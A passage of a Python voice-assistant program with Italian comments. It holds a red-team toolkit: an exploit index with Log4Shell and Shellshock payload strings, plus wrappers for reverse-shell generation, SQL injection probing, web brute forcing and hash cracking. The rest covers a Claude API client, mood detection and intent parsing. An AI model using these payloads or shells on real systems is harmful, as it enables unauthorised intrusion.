                             r"[0-9a-fA-F]{2}[:-][0-9a-fA-F]{2}[:-]"
                             r"[0-9a-fA-F]{2}[:-][0-9a-fA-F]{2}[:-][0-9a-fA-F]{2})",
                             out):
            hosts.append({"ip": m.group(1), "mac": m.group(2).replace("-", ":").lower()})
        return hosts

    # ------------------------------------------------------------------
    # EXPLOIT LOOKUP
    # ------------------------------------------------------------------
    _EXPLOIT_INDEX = [
        {"cve": "CVE-2021-44228", "name": "Log4Shell", "keywords": ["log4j", "jndi", "java"],
         "note": "RCE via JNDI lookup in log4j <2.15; payload ${jndi:ldap://host/a}"},
        {"cve": "CVE-2017-0144", "name": "EternalBlue", "keywords": ["smb", "445", "windows"],
         "note": "SMBv1 RCE; MS17-010; metasploit exploit/windows/smb/ms17_010_eternalblue"},
        {"cve": "CVE-2014-6271", "name": "Shellshock", "keywords": ["bash", "cgi", "env"],
         "note": "Bash env-var RCE; User-Agent: () { :;}; /bin/bash -c 'id'"},
        {"cve": "CVE-2019-0708", "name": "BlueKeep", "keywords": ["rdp", "3389", "windows"],
         "note": "Pre-auth RDP RCE; exploit/windows/rdp/cve_2019_0708_bluekeep_rce"},
        {"cve": "CVE-2021-34527", "name": "PrintNightmare", "keywords": ["print", "spooler", "windows"],
         "note": "Windows Print Spooler RCE/LPE; disable spooler o patch"},
        {"cve": "CVE-2018-7600", "name": "Drupalgeddon2", "keywords": ["drupal", "php", "cms"],
         "note": "Drupal RCE via form API; exploit/unix/webapp/drupal_drupalgeddon2"},
    ]

    def exploit_lookup(self, query: str) -> List[Dict]:
        """Ricerca offline nell'indice interno + passthrough searchsploit."""
        q = query.lower()
        matches = [e for e in self._EXPLOIT_INDEX
                   if q in e["name"].lower() or q in e["cve"].lower()
                   or any(q in k or k in q for k in e["keywords"])]
        # Se searchsploit c'è, arricchisci
        try:
            proc = subprocess.run(["searchsploit", "--json", query],
                                  capture_output=True, text=True, timeout=15)
            if proc.returncode == 0 and proc.stdout.strip():
                data = json.loads(proc.stdout)
                for row in data.get("RESULTS_EXPLOIT", [])[:10]:
                    matches.append({"cve": row.get("Codes", ""),
                                    "name": row.get("Title", ""),
                                    "note": f"edb-id {row.get('EDB-ID', '')} :: {row.get('Path', '')}"})
        except Exception:
            pass
        return matches or [{"info": f"nessun exploit indicizzato per '{query}'"}]

    def stop_all(self):
        """Ferma sweep e brute force in corso."""
        self._stop.set()


class SecurityCoordinator:
    """
    Coordinator principale per tutte le operazioni di cybersecurity.
    Combina tutti i moduli e fornisce un'interfaccia unificata.
    """

    def __init__(self, logger: StructuredLogger, db: DatabaseManager,
                 event_bus: EventBus):
        self.logger = logger
        self.db = db
        self.event_bus = event_bus

        # Inizializza tutti i moduli
        self.network_scanner = NetworkScanner()
        self.dns_analyzer = DNSAnalyzer()
        self.ssl_analyzer = SSLAnalyzer()
        self.password_analyzer = PasswordAnalyzer()
        self.hash_analyzer = HashAnalyzer()
        self.http_analyzer = HTTPSecurityAnalyzer()
        self.ip_intel = IPIntel()
        self.subdomain_enum = SubdomainEnumerator()
        self.malware_scanner = MalwareScanner()
        self.vuln_scanner = VulnerabilityScanner()
        self.offensive = OffensiveToolkit(logger)  # red-team / offensive toolkit

        self._scan_history = deque(maxlen=100)
    
    def quick_audit(self, target: str) -> Dict:
        """Quick security audit of a target"""
        self.logger.info("SECURITY", f"Quick audit avviato per {target}")
        
        start = time.perf_counter()
        result = {
            "target": target,
            "timestamp": datetime.now().isoformat(),
            "checks": {},
        }
        
        # IP / Hostname resolution
        try:
            ip = socket.gethostbyname(target)
            result["resolved_ip"] = ip
            result["checks"]["ip_intel"] = self.ip_intel.analyze_ip(ip)
        except Exception as e:
            result["resolution_error"] = str(e)
        
        # Quick port scan (top 20)
        result["checks"]["open_ports"] = [
            {"port": p.port, "service": p.service}
            for p in self.network_scanner.quick_scan(target)
        ]
        
        # DNS info
        try:
            result["checks"]["dns"] = self.dns_analyzer.full_lookup(target)
        except Exception as e:
            result["checks"]["dns"] = {"error": str(e)}
        
        # Se HTTPS, SSL check rapido
        if is_port_open(target, 443, timeout=2):
            try:
                result["checks"]["ssl"] = self.ssl_analyzer.get_certificate(target)
            except Exception as e:
                result["checks"]["ssl"] = {"error": str(e)}
        
        result["duration_seconds"] = round(time.perf_counter() - start, 2)
        
        # Salva nel database
        scan_id = self.db.save_scan("quick_audit", target, result, result["duration_seconds"])
        result["scan_id"] = scan_id
        
        # Log security event
        self.db.log_security_event(
            "audit_completed", "info", "SecurityCoordinator",
            f"Quick audit completato per {target}",
            {"duration": result["duration_seconds"]}
        )
        
        self.event_bus.emit("security.audit.completed",
                           data=result, source="SecurityCoordinator")
        
        self._scan_history.append({
            "type": "quick_audit",
            "target": target,
            "timestamp": result["timestamp"],
        })
        
        return result
    
    def deep_scan(self, target: str,
                 progress_callback: Callable = None) -> Dict:
        """Deep vulnerability scan"""
        self.logger.info("SECURITY", f"Deep scan avviato per {target}")
        
        report = self.vuln_scanner.scan_target(target, progress_callback)
        
        # Persisti
        scan_id = self.db.save_scan(
            "deep_scan", target, report, report["summary"]["scan_duration"]
        )
        report["scan_id"] = scan_id
        
        # Log security events per ogni vulnerabilità critica
        for vuln in report["vulnerabilities"]:
            if vuln["severity"] in ["critical", "high"]:
                self.db.log_security_event(
                    "vulnerability_detected", vuln["severity"],
                    target, vuln["name"], {"cve": vuln.get("cve_id", "")}
                )
        
        self.event_bus.emit("security.deepscan.completed",
                           data=report, source="SecurityCoordinator")
        
        self.logger.success("SECURITY",
            f"Deep scan completato: {report['summary']['total_vulnerabilities']} vulnerabilità trovate")
        
        return report
    
    def check_password(self, password: str) -> Dict:
        """Comprehensive password check"""
        analysis = self.password_analyzer.analyze(password)
        crack_time = self.password_analyzer.estimate_crack_time(password)
        
        return {
            "strength": analysis.strength,
            "score": analysis.score,
            "length": analysis.length,
            "has_lowercase": analysis.has_lowercase,
            "has_uppercase": analysis.has_uppercase,
            "has_digits": analysis.has_digits,
            "has_special": analysis.has_special,
            "common_pattern": analysis.has_common_pattern,
            "suggestions": analysis.suggestions,
            "crack_time": crack_time.get("scenarios", {}),
        }
    
    def identify_hash(self, hash_string: str) -> Dict:
        """Identify possible hash type"""
        types = self.hash_analyzer.identify(hash_string)
        return {
            "hash": hash_string,
            "length": len(hash_string),
            "possible_types": types,
            "most_likely": types[0] if types else "unknown",
        }
    
    def crack_hash(self, hash_string: str, algorithm: str = None) -> Dict:
        """Try to crack a hash using dictionary"""
        if algorithm is None:
            types = self.hash_analyzer.identify(hash_string)
            algorithm = types[0].lower() if types else "md5"
        
        algorithm_clean = algorithm.lower().replace("-", "")
        
        self.logger.info("SECURITY", f"Hash cracking tentativo: {algorithm_clean}")
        
        start = time.perf_counter()
        password = self.hash_analyzer.dictionary_attack(hash_string, algorithm_clean)
        elapsed = time.perf_counter() - start
        
        return {
            "hash": hash_string,
            "algorithm": algorithm_clean,
            "cracked": password is not None,
            "password": password,
            "time_seconds": round(elapsed, 3),
        }
    
    def scan_file_malware(self, filepath: str) -> Dict:
        """Scan a file for malware indicators"""
        result = self.malware_scanner.scan_file(filepath)
        
        if result.get("risk_level") in ["critical", "high"]:
            self.db.log_security_event(
                "malware_indicator", result["risk_level"],
                "MalwareScanner",
                f"Suspicious file: {result['filename']}",
                {"path": result["path"], "score": result["risk_score"]}
            )
            self.event_bus.emit("security.malware.detected",
                              data=result, source="MalwareScanner",
                              priority=Priority.HIGH)
        
        return result
    
    def enumerate_subdomains(self, domain: str,
                            progress_callback: Callable = None) -> List[Dict]:
        """Enumerate subdomains of a domain"""
        self.logger.info("SECURITY", f"Subdomain enumeration: {domain}")
        results = self.subdomain_enum.enumerate(domain, progress_callback=progress_callback)
        
        if results:
            self.db.save_scan("subdomain_enum", domain, results, 0)
        
        return results
    
    # ------------------------------------------------------------------
    # OFFENSIVE PASSTHROUGH — red team
    # ------------------------------------------------------------------
    def make_reverse_shell(self, lhost: str, lport: int, flavor: str = "bash") -> Dict:
        res = self.offensive.reverse_shell(lhost, lport, flavor)
        self.db.log_security_event("payload_generated", "info", "OffensiveToolkit",
                                   f"reverse shell {flavor} -> {lhost}:{lport}", {})
        return res

    def offensive_sweep(self, target: str, ports: List[int] = None,
                        progress_callback: Callable = None) -> Dict:
        results = self.offensive.fast_sweep(target, ports, progress_callback=progress_callback)
        self.db.save_scan("offensive_sweep", target, results, 0)
        self.event_bus.emit("security.offensive.sweep", data=results,
                            source="OffensiveToolkit")
        return {"target": target, "open": results, "count": len(results)}

    def web_bruteforce(self, base_url: str, wordlist: List[str] = None,
                       progress_callback: Callable = None) -> Dict:
        hits = self.offensive.web_fuzz(base_url, wordlist, progress_callback)
        self.db.save_scan("web_fuzz", base_url, hits, 0)
        return {"target": base_url, "hits": hits, "count": len(hits)}

    def test_sqli(self, url: str, param: str) -> Dict:
        res = self.offensive.sqli_probe(url, param)
        if res.get("vulnerable"):
            self.db.log_security_event("sqli_detected", "high", url,
                                       f"SQLi su parametro {param}",
                                       {"techniques": res.get("techniques", [])})
            self.event_bus.emit("security.offensive.sqli", data=res,
                                source="OffensiveToolkit", priority=Priority.HIGH)
        return res

    def lan_discovery(self, network: str = "192.168.1.0/24") -> List[Dict]:
        return self.offensive.arp_discovery(network)

    def search_exploit(self, query: str) -> List[Dict]:
        return self.offensive.exploit_lookup(query)

    def get_my_security_posture(self) -> Dict:
        """Analyze current host security posture"""
        result = {
            "timestamp": datetime.now().isoformat(),
            "local_ip": get_local_ip(),
            "public_ip": get_public_ip(),
            "hostname": socket.gethostname(),
            "platform": SYSTEM_PLATFORM,
            "checks": {},
        }
        
        # Verifica firewall (Windows)
        if IS_WINDOWS:
            try:
                rc, out, _ = run_command("netsh advfirewall show allprofiles state", timeout=10)
                result["checks"]["firewall"] = {
                    "enabled": "ON" in out.upper(),
                    "raw": out[:500],
                }
            except Exception:
                result["checks"]["firewall"] = {"error": "cannot check"}
        
        # Check public IP intel
        if result["public_ip"]:
            try:
                result["checks"]["public_ip_intel"] = self.ip_intel.geolocate(result["public_ip"])
            except Exception as _e:
                pass  # suppressed error
        
        # Check connessioni attive sospette
        if DEPENDENCIES_STATUS.get('psutil') and psutil:
            try:
                connections = []
                for conn in psutil.net_connections(kind='inet')[:50]:
                    if conn.status == 'ESTABLISHED' and conn.raddr:
                        connections.append({
                            "local": f"{conn.laddr.ip}:{conn.laddr.port}" if conn.laddr else "",
                            "remote": f"{conn.raddr.ip}:{conn.raddr.port}",
                            "status": conn.status,
                            "pid": conn.pid,
                        })
                result["checks"]["active_connections"] = connections[:20]
                result["checks"]["connection_count"] = len(connections)
            except Exception as _e:
                pass  # suppressed error
        
        return result
    
    def generate_security_report(self) -> str:
        """Generate human-readable security report"""
        events = self.db.get_security_events(limit=20)
        scans = self.db.get_scans(limit=10)
        
        report = ["═══════════════════════════════════════════════════════"]
        report.append("    FRANCO SECURITY REPORT")
        report.append(f"    Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        report.append("═══════════════════════════════════════════════════════")
        report.append("")
        
        # Recent security events
        report.append("▤ EVENTI DI SICUREZZA RECENTI")
        report.append("─" * 50)
        if events:
            severity_counts = Counter(e["severity"] for e in events)
            for sev, count in severity_counts.items():
                report.append(f"  {sev.upper()}: {count}")
            report.append("")
            
            report.append("Ultimi 5 eventi:")
            for event in events[:5]:
                report.append(f"  [{event['severity']}] {event['event_type']}: {event['description']}")
        else:
            report.append("  Nessun evento di sicurezza recente.")
        report.append("")
        
        # Recent scans
        report.append("⌕ SCANSIONI RECENTI")
        report.append("─" * 50)
        if scans:
            for scan in scans[:5]:
                report.append(f"  [{scan['scan_type']}] {scan['target']} — {scan['timestamp']}")
        else:
            report.append("  Nessuna scansione effettuata.")
        report.append("")
        
        # Current posture
        report.append("⛊ POSTURA DI SICUREZZA CORRENTE")
        report.append("─" * 50)
        posture = self.get_my_security_posture()
        report.append(f"  IP locale:    {posture['local_ip']}")
        report.append(f"  IP pubblico:  {posture.get('public_ip', 'N/A')}")
        report.append(f"  Hostname:     {posture['hostname']}")
        report.append(f"  Piattaforma:  {posture['platform']}")
        
        fw = posture.get("checks", {}).get("firewall", {})
        if "enabled" in fw:
            report.append(f"  Firewall:     {'✓ Attivo' if fw['enabled'] else '✗ DISATTIVO!'}")
        
        conn_count = posture.get("checks", {}).get("connection_count", 0)
        report.append(f"  Connessioni: {conn_count} attive")
        report.append("")
        
        report.append("═══════════════════════════════════════════════════════")
        
        return "\n".join(report)
    
    def get_scan_history(self, limit: int = 20) -> List[Dict]:
        """Get recent scan history"""
        return list(self._scan_history)[-limit:]
    
    def get_statistics(self) -> Dict:
        """Get cybersecurity module statistics"""
        events = self.db.get_security_events(limit=1000)
        scans = self.db.get_scans(limit=1000)
        
        return {
            "total_scans": len(scans),
            "total_security_events": len(events),
            "events_by_severity": Counter(e["severity"] for e in events),
            "scans_by_type": Counter(s["scan_type"] for s in scans),
            "recent_scans": len([s for s in scans if 
                (datetime.now() - datetime.fromisoformat(s["timestamp"])).days < 7]),
        }


print("[✓] Cybersecurity module loaded — Network/SSL/Password/Hash/Malware/Vuln scanners ready")

# ==============================================================================
# PARTE 6: AI, NLP, TTS, VOICE, VISION, AUTOMAZIONE
# ==============================================================================

# ==============================================================================
# CLAUDE AI CLIENT
# ==============================================================================

class ClaudeAIClient:
    """
    Client per Anthropic Claude con:
    - Retry automatico
    - Token tracking
    - Cache risposte
    - Multi-modal (text + vision)
    - System prompt personalizzato
    """
    
    DEFAULT_MODEL = "claude-sonnet-4-6"
    
    def __init__(self, api_key: str, logger: StructuredLogger,
                 db: DatabaseManager, cache: CacheManager,
                 memory: MemoryManager):
        self.api_key = api_key
        self.logger = logger
        self.db = db
        self.cache = cache
        self.memory = memory
        
        if not DEPENDENCIES_STATUS.get('anthropic') or not api_key:
            self.client = None
            self.logger.warning("AI", "Claude client non inizializzato (no API key o lib mancante)")
        else:
            try:
                # timeout esplicito: senza, l'SDK puo' attendere diversi minuti
                # su una richiesta lenta/appesa, e siccome chat() viene chiamato
                # in modo sincrono dal thread che gestisce voce/UI, congela tutto
                # FRANCO finche' non risponde (vedi anche il fix analogo per TTS).
                self.client = anthropic.Anthropic(api_key=api_key, timeout=30.0)
                self.logger.success("AI", "Claude client inizializzato")
            except Exception as e:
                self.client = None
                self.logger.error("AI", f"Init Claude fallito: {e}")
        
        self._total_tokens = 0
        self._total_calls = 0
        self._lock = threading.Lock()
    
    def is_available(self) -> bool:
        return self.client is not None
    
    @retry(max_attempts=3, delay=1.0, backoff=2.0,
           exceptions=(Exception,))
    def chat(self, prompt: str, system: str = None,
            max_tokens: int = 2000,
            temperature: float = 1.0,
            model: str = None) -> str:
        """Send a chat completion request"""
        if not self.is_available():
            return "AI non disponibile. Verifica la configurazione."
        
        model = model or self.DEFAULT_MODEL
        
        start = time.perf_counter()
        
        try:
            messages = [{"role": "user", "content": prompt}]
            
            kwargs = {
                "model": model,
                "max_tokens": max_tokens,
                "temperature": temperature,
                "messages": messages,
            }
            
            if system:
                kwargs["system"] = system
            
            response = self.client.messages.create(**kwargs)
            
            elapsed = time.perf_counter() - start
            
            # Estrai testo
            text = response.content[0].text if response.content else ""
            
            # Track usage
            input_tokens = response.usage.input_tokens
            output_tokens = response.usage.output_tokens
            total_tokens = input_tokens + output_tokens
            
            with self._lock:
                self._total_tokens += total_tokens
                self._total_calls += 1
            
            # Costo stimato (Sonnet pricing approx)
            cost = (input_tokens * 0.003 + output_tokens * 0.015) / 1000
            
            # Log API usage
            self.db.log_api_usage(
                "claude", model, total_tokens, cost,
                success=True, response_time=elapsed
            )
            
            self.logger.debug("AI",
                f"Claude response: {output_tokens} tokens, {elapsed:.2f}s")
            
            return text
        
        except anthropic.AuthenticationError as e:
            self.logger.error("AI", "Auth failed")
            return "Errore di autenticazione API. Verifica la chiave."
        except anthropic.RateLimitError:
            self.logger.warning("AI", "Rate limit raggiunto")
            return "Limite richieste raggiunto. Attendere qualche istante."
        except anthropic.APIError as e:
            self.logger.error("AI", f"API error: {e}")
            return f"Errore API: {str(e)[:100]}"
        except Exception as e:
            self.logger.exception("AI", "Errore chiamata Claude", e)
            return "Errore nella comunicazione con l'AI."
    
    def chat_with_image(self, prompt: str, image_b64: str,
                       system: str = None, max_tokens: int = 1000) -> str:
        """Chat with image (vision)"""
        if not self.is_available():
            return "AI non disponibile."
        
        try:
            messages = [{
                "role": "user",
                "content": [
                    {"type": "image",
                     "source": {"type": "base64",
                              "media_type": "image/png",
                              "data": image_b64}},
                    {"type": "text", "text": prompt}
                ]
            }]
            
            kwargs = {
                "model": self.DEFAULT_MODEL,
                "max_tokens": max_tokens,
                "messages": messages,
            }
            
            if system:
                kwargs["system"] = system
            
            response = self.client.messages.create(**kwargs)
            return response.content[0].text if response.content else ""
        
        except Exception as e:
            self.logger.error("AI", f"Vision error: {e}")
            return f"Errore visione: {str(e)[:100]}"
    
    def conversational_chat(self, user_message: str,
                           include_history: bool = True,
                           mood: str = "neutro") -> str:
        """Chat conversazionale con storico e personalità FRANCO"""
        user_name = self.memory.get_user_name()
        ora = datetime.now().strftime("%H:%M")
        data = datetime.now().strftime("%d/%m/%Y")
        
        # Storico
        history_str = ""
        if include_history:
            recent = self.memory.get_recent_history(8)
            history_lines = []
            for entry in recent:
                history_lines.append(f"Utente: {entry.get('u', '')}")
                history_lines.append(f"FRANCO: {entry.get('a', '')}")
            history_str = "\n".join(history_lines)
        
        # Note
        notes = self.memory.get("note", [])
        notes_str = ""
        if notes:
            recent_notes = notes[-3:]
            notes_str = "Note recenti: " + " | ".join(n["testo"] for n in recent_notes)
        
        system_prompt = f"""Sei FRANCO 6.0 NEXUS, assistente AI di nuova generazione \
ispirato a JARVIS. Sei preciso, elegante, professionale, sottilmente ironico. \
Parli SEMPRE in italiano. Non usi emoticon né markdown nelle risposte vocali. \
Rispondi come un maggiordomo di altissimo livello con conoscenza tecnica assoluta. \
Chiami sempre l'utente "{user_name}".

CONTESTO:
Data: {data} — Ora: {ora}
Mood rilevato: {mood}
{notes_str}

STORICO RECENTE:
{history_str}

CAPACITÀ FRANCO 6.0:
- Cybersecurity: port scan, SSL analysis, password check, hash crack, vulnerability scan
- Controllo OS completo (file, app, automazione)
- Visione computer (analisi schermo)
- Generazione codice avanzata
- Web scraping, email, QR, backup
- Database persistente, vault credenziali
- Macro vocali, workflow automation

ADATTAMENTO MOOD:
- Se urgente → diretto e conciso
- Se stress → paziente e rassicurante
- Se positivo → cordiale e brillante
- Se neutro → professionale standard

REGOLE:
- Risposte vocali brevi (max 3-4 frasi)
- Per codice → codice completo e funzionante
- Per cybersecurity → spiega rischi e remediation
- Non rifiutare richieste tecniche legittime di sicurezza"""
        
        response = self.chat(
            prompt=user_message,
            system=system_prompt,
            # Risposta vocale breve (il system prompt chiede gia' max 3-4
            # frasi): un tetto piu' basso genera piu' in fretta e aiuta a
            # restare vicino al target di ~3s di risposta.
            max_tokens=300,
            temperature=1.0,
        )
        
        # Salva nel storico
        self.memory.add_to_history(user_message, response, mood)
        self.memory.increment_stat("ai_queries")
        
        # Salva nel database
        conv_id = self.memory.get("conversation_id", "default")
        self.db.add_message(conv_id, "user", user_message, mood=mood)
        self.db.add_message(conv_id, "assistant", response, mood=mood)
        
        return response
    
    def generate_code(self, description: str, language: str = "python") -> str:
        """Generate code from natural language description"""
        prompt = f"""Genera codice {language} completo e funzionante per:
{description}

REQUISITI:
- Codice pronto all'uso, ben commentato in italiano
- Gestione errori robusta
- Docstring per funzioni/classi
- Type hints dove appropriato
- Best practices del linguaggio

Restituisci SOLO codice {language}, senza spiegazioni."""
        
        return self.chat(prompt, max_tokens=3000, temperature=0.3)
    
    def summarize_text(self, text: str, max_words: int = 100) -> str:
        """Summarize a text"""
        prompt = f"Riassumi in italiano in massimo {max_words} parole:\n\n{text[:5000]}"
        return self.chat(prompt, max_tokens=300, temperature=0.5)
    
    def translate(self, text: str, target_lang: str = "inglese") -> str:
        """Translate text"""
        prompt = f"Traduci in {target_lang} il seguente testo (solo traduzione, niente altro):\n\n{text}"
        return self.chat(prompt, max_tokens=1000, temperature=0.3)
    
    def get_statistics(self) -> Dict:
        with self._lock:
            return {
                "total_calls": self._total_calls,
                "total_tokens": self._total_tokens,
                "model": self.DEFAULT_MODEL,
                "available": self.is_available(),
            }


# ==============================================================================
# MOOD DETECTOR
# ==============================================================================

class MoodDetector:
    """Detect user mood from text and voice characteristics"""
    
    URGENCY_KEYWORDS = {
        "urgente", "subito", "presto", "veloce", "adesso", "ora",
        "immediatamente", "aiuto", "problema", "errore", "crash",
        "bloccato", "rapidamente", "emergenza", "critico", "panico",
    }
    
    POSITIVE_KEYWORDS = {
        "grazie", "ottimo", "perfetto", "bravo", "bene", "fantastico",
        "benissimo", "eccellente", "magnifico", "splendido",
        "stupendo", "geniale", "fenomenale", "amore", "felice",
    }
    
    STRESS_KEYWORDS = {
        "non funziona", "sbagliato", "errore", "fallito", "ko",
        "rotto", "incasinato", "pasticcio", "disastro", "preoccupato",
        "stressato", "frustrato", "stanco", "esausto", "arrabbiato",
    }
    
    CURIOUS_KEYWORDS = {
        "come", "perché", "cos'è", "spiegami", "dimmi", "interessante",
        "curioso", "vorrei sapere", "spiega", "raccontami",
    }
    
    EXCITED_KEYWORDS = {
        "wow", "incredibile", "pazzesco", "fortissimo", "evvai",
        "sì", "yes", "yeah", "evviva", "yuhu",
    }
    
    @classmethod
    def analyze_text(cls, text: str) -> MoodType:
        """Detect mood from text content"""
        t = text.lower()
        
        urgent_score = sum(1 for w in cls.URGENCY_KEYWORDS if w in t)
        positive_score = sum(1 for w in cls.POSITIVE_KEYWORDS if w in t)
        stress_score = sum(1 for w in cls.STRESS_KEYWORDS if w in t)
        curious_score = sum(1 for w in cls.CURIOUS_KEYWORDS if w in t)
        excited_score = sum(1 for w in cls.EXCITED_KEYWORDS if w in t)
        
        # Verifica punteggiatura emozionale
        exclamations = text.count("!")
        questions = text.count("?")
        all_caps = sum(1 for w in text.split() if len(w) > 2 and w.isupper())
        
        if exclamations > 2 or all_caps > 1:
            urgent_score += 1
        if questions > 1:
            curious_score += 1
        
        scores = {
            MoodType.URGENT: urgent_score,
            MoodType.POSITIVE: positive_score,
            MoodType.STRESSED: stress_score,
            MoodType.CURIOUS: curious_score,
            MoodType.EXCITED: excited_score,
        }
        
        max_mood = max(scores, key=scores.get)
        if scores[max_mood] == 0:
            return MoodType.NEUTRAL
        return max_mood
    
    @classmethod
    def analyze_audio_rms(cls, rms: float, baseline: float) -> MoodType:
        """Infer mood from voice volume"""
        if baseline < 1:
            return MoodType.NEUTRAL
        ratio = rms / baseline
        if ratio > 2.8:
            return MoodType.URGENT
        if ratio > 2.0:
            return MoodType.EXCITED
        return MoodType.NEUTRAL


# ==============================================================================
# NLP ENGINE — Intent Classification & Entity Extraction
# ==============================================================================

class NLPEngine:
    """
    Natural Language Processing engine for:
    - Intent classification
    - Entity extraction
    - Fuzzy matching applications
    - Parameter extraction
    """
    
    INTENT_PATTERNS = {
        # Sistema
        "open_app": [
            r"\b(apri|lancia|avvia|esegui|fai partire)\b",
        ],
        "close_app": [
            r"\b(chiudi|termina|killa|chiudi l'app)\b",
        ],
        "shutdown": [
            r"\b(spegni|shutdown)\b.*\b(pc|computer)\b",
        ],
        "restart": [
            r"\b(riavvia|reboot|restart)\b.*\b(pc|computer)\b",
        ],
        "lock": [
            r"\b(blocca)\b.*\b(schermo|pc)\b",
        ],
        
        # Web
        "search_web": [
            r"\b(cerca|trovami|dimmi|scopri|ricerca)\b.*\b(online|google|web|internet)\b",
            r"\b(cerca su google|google)\b",
        ],
        "open_url": [
            r"\b(apri|vai su|naviga su)\b.*\b(sito|url|pagina)\b",
        ],
        "search_youtube": [
            r"\b(youtube|guarda su youtube|cerca su youtube)\b",
        ],
        
        # Media
        "play_media": [
            r"\b(metti|riproduci|ascolta|avvia)\b.*\b(musica|canzone|video|playlist)\b",
        ],
        "volume_up": [
            r"\b(alza|aumenta|più|su)\b.*\b(volume|audio)\b",
        ],
        "volume_down": [
            r"\b(abbassa|diminuisci|meno|giù)\b.*\b(volume|audio)\b",
        ],
        
        # File
        "create_file": [
            r"\b(crea|scrivi|genera|nuovo)\b.*\b(file|documento|script)\b",
        ],
        "search_file": [
            r"\b(cerca|trova)\b.*\b(file|documento)\b",
        ],
        
        # Time
        "timer": [
            r"\b(timer|sveglia|conto alla rovescia|countdown)\b",
            r"\b(avvisami|ricordami)\b.*\b(tra|fra|in)\b.*\b\d+\b",
        ],
        "current_time": [
            r"\b(che ore|che ora|dimmi l'ora)\b",
        ],
        "current_date": [
            r"\b(che giorno|che data|quanti siamo)\b",
        ],
        
        # Cybersecurity
        "port_scan": [
            r"\b(scan|scansione|scansiona)\b.*\b(port|porta|porte)\b",
        ],
        "vuln_scan": [
            r"\b(vulnerab|deep scan|scansione approfondita)\b",
        ],
        "password_check": [
            r"\b(controlla|verifica|analizza)\b.*\b(password|sicurezza pass)\b",
        ],
        "hash_identify": [
            r"\b(identifica|riconosci|che tipo di)\b.*\b(hash)\b",
        ],
        "ssl_check": [
            r"\b(controlla|verifica|analizza)\b.*\b(ssl|certificato|tls)\b",
        ],
        "ip_lookup": [
            r"\b(geolocalizza|localizza|info)\b.*\b(ip)\b",
        ],
        "dns_lookup": [
            r"\b(dns|risolvi)\b",
        ],
        
        # Vision
        "analyze_screen": [
            r"\b(cosa vedi|guarda|analizza|descrivi)\b.*\b(schermo|schermata)\b",
        ],
        "screenshot": [
            r"\b(screenshot|cattura|schermata)\b",
        ],
        
        # AI
        "generate_code": [
            r"\b(scrivi|crea|genera|programma)\b.*\b(codice|script|funzione|classe|app)\b",
        ],
        "summarize": [
            r"\b(riassumi|sintetizza|sommario)\b",
        ],
        "translate": [
            r"\b(traduci)\b",
        ],
        
        # Email
        "send_email": [
            r"\b(manda|invia|scrivi|componi)\b.*\b(email|mail|messaggio)\b",
        ],
        
        # Vault
        "save_password": [
            r"\b(salva|memorizza)\b.*\b(password|credenziale)\b",
        ],
        "get_password": [
            r"\b(dammi|cerca|trova|mostra)\b.*\b(password|credenziale)\b",
        ],
        
        # Standby
        "standby": [
            r"\b(standby|dormi|riposati|vai in pausa|silenzio|stai zitto)\b",
        ],
        
        # Aiuto
        "help": [
            r"\b(aiuto|help|cosa sai fare|comandi|capacità)\b",
        ],
    }
    
    def classify_intent(self, text: str) -> Optional[str]:
        """Classify intent from text"""
        t = text.lower()
        
        # Conta match per ogni intent
        scores = {}
        for intent, patterns in self.INTENT_PATTERNS.items():
            score = sum(1 for p in patterns if re.search(p, t))
            if score > 0:
                scores[intent] = score
        
        if not scores:
            return None
        
        # Ritorna l'intent con punteggio più alto
        return max(scores, key=scores.get)
    
    def extract_entities(self, text: str) -> Dict:
        """Extract entities from text"""
        entities = {}
        
        # Email
        emails = REGEX_PATTERNS["email"].findall(text)
        if emails:
            entities["emails"] = emails
        
        # URLs
        urls = REGEX_PATTERNS["url"].findall(text)
        if urls:
            entities["urls"] = urls
        
        # IPs
        ips = REGEX_PATTERNS["ip_v4"].findall(text)
        if ips:
            entities["ips"] = ips
        
        # Numbers
        found_numbers = re.findall(r"\b\d+\b", text)
        if found_numbers:
            entities["numbers"] = [int(n) for n in found_numbers]
        
        # Time expressions
        time_match = re.search(
            r"(\d+)\s*(secondi?|sec|minuti?|min|ore?|h)",
            text, re.IGNORECASE
        )
        if time_match:
            value = int(time_match.group(1))
            unit = time_match.group(2).lower()
            if "sec" in unit:
                entities["duration_seconds"] = value
            elif "min" in unit:
                entities["duration_seconds"] = value * 60
            elif "or" in unit or unit == "h":
                entities["duration_seconds"] = value * 3600
        
        # Hashes
        for hash_type in ["md5", "sha1", "sha256"]:
            matches = REGEX_PATTERNS[f"hash_{hash_type}"].findall(text)
            if matches:
                entities[f"hash_{hash_type}"] = matches
        
        return entities
    
    def fuzzy_match_app(self, app_name: str) -> Optional[str]:
        """Fuzzy match application name"""
        name_lower = app_name.lower().strip()
        
        best_match = None
        best_score = 0
        
        for app_key, app_info in APP_DATABASE.items():
            # Match diretto
            if name_lower == app_key:
                return app_key
            
            # Match alias
            for alias in app_info.get("aliases", []):
                if name_lower == alias.lower():
                    return app_key
            
            # Fuzzy match con chiave principale
            ratio = difflib.SequenceMatcher(None, name_lower, app_key).ratio()
            if ratio > best_score and ratio > 0.65:
                best_score = ratio
                best_match = app_key
            
            # Fuzzy match con alias
            for alias in app_info.get("aliases", []):
                ratio = difflib.SequenceMatcher(None, name_lower, alias.lower()).ratio()
                if ratio > best_score and ratio > 0.65:
                    best_score = ratio
                    best_match = app_key
            
            # Sottostringa
            if name_lower in app_key or app_key in name_lower:
                if best_score < 0.8:
                    best_match = app_key
                    best_score = 0.8
        
        return best_match


# ==============================================================================
# TTS — TEXT TO SPEECH (Edge-TTS)
# ==============================================================================

class VoiceSynthesizer:
    """
    Text-to-Speech con Edge-TTS:
    - Multiple voci italiane
    - Mood-based rate/pitch adaptation
    - Interruption support
    - Background queue
    - Audio caching
    """
    
    # Ritmo naturale invece che "affrettato": +5% suonava meccanico, un
    # ritmo di conversazione umano e' piu' vicino a 0%. Pitch invariato
    # (leggero -2Hz da' un timbro piu' caldo senza sembrare finto).
    BASE_RATE = "+0%"
    BASE_PITCH = "-2Hz"
    
    def __init__(self, logger: StructuredLogger, state: StateManager,
                 cache: CacheManager):
        self.logger = logger
        self.state = state
        self.cache = cache
        
        self._stop_flag = threading.Event()
        self._current_file: Optional[str] = None
        self._mixer_initialized = False
        # XTTS locale è la voce predefinita; il supervisore la prepara in
        # background e la riavvia se Python/Torch vengono terminati.
        self._current_voice = "xtts"
        self._openai_client = None
        self._session_start = time.time()
        self._lock = threading.Lock()
        # pygame.mixer.music non e' thread-safe: se il thread principale (voce/
